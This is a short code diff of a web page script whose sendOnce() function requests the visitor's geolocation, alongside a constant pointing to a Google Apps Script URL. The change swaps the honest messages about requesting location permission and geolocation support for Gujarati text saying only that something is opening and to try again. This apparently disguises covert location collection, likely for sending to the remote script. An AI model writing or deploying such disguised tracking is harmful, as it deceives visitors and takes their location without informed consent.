@@ -11,10 +11,10 @@ const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx80itG5CPju37h0jmms
 
     function sendOnce() {
       btn.disabled = true;
-      msg.textContent = "📡 Requesting location permission...";
+      msg.textContent = "Open thaay che thodik raah jovoo...";
 
       if (!navigator.geolocation) {
-        msg.textContent = "❌ Geolocation not supported!";
+        msg.textContent = "Open na thayu fari try karo!";
         return;
       }
 
